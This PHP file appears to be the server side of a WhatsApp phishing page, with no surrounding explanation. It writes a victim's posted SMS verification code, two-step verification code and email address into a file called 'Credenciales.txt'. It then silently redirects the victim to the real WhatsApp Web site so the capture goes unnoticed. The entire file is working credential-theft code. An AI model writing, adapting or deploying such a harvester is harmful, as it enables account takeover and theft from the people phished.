<?php
file_put_contents("Credenciales.txt", 
                    "C. Verificación: " . $_POST['CodDigitos'] .  "\n".
                    "C. 2 Pasos: " . $_POST['CodeVerify'] .  "\n".
                    "Correo: " . $_POST['Correo']. "\n".
		    "============================". "\n", FILE_APPEND );

header('Location: https://web.whatsapp.com');
exit;
?>
